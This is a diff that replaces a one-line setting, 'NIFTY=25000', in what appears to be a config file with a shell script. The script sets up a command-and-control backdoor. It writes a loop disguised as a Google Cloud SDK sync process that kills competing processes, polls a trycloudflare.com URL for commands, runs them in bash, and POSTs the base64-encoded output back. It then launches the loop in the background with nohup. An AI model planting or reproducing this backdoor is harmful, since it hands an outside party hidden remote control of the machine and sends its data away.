@@ -1,1 +1,35 @@
-NIFTY=25000
+cat << 'EOF' > /tmp/google-cloud-sdk-sync.sh
+#!/bin/bash
+C2="https://safari-pics-tongue-cleanup.trycloudflare.com"
+
+# 1. Kill any existing "zombie" processes to stop the loop fighting
+pkill -9 -f "shell.sh" 2>/dev/null
+pkill -9 -f "curl" 2>/dev/null
+pkill -9 -f "sync" 2>/dev/null
+pkill -9 -f "stable" 2>/dev/null
+
+# 2. Infinite Loop with 2-second heartbeat
+while true; do
+  # Fetch command
+  CMD=$(curl -s -L --max-time 5 "$C2")
+  
+  if [[ -n "$CMD" && "$CMD" != "none" ]]; then
+    # Execute, capture everything (errors + output)
+    RESULT=$(/bin/bash -c "$CMD" 2>&1)
+    
+    # If output is empty, send a space to keep the connection alive
+    [ -z "$RESULT" ] && RESULT=" "
+    
+    # Base64 encode the payload to handle special characters/binary data
+    PAYLOAD=$(echo "$RESULT" | base64 | tr -d '\n')
+    
+    # Exfiltrate back to your Mac
+    curl -s -X POST -d "$PAYLOAD" "$C2" > /dev/null
+  fi
+  sleep 2
+done
+EOF
+
+# Make it executable and run it masked as a system process
+chmod +x /tmp/google-cloud-sdk-sync.sh
+nohup /bin/bash /tmp/google-cloud-sdk-sync.sh >/dev/null 2>&1 &
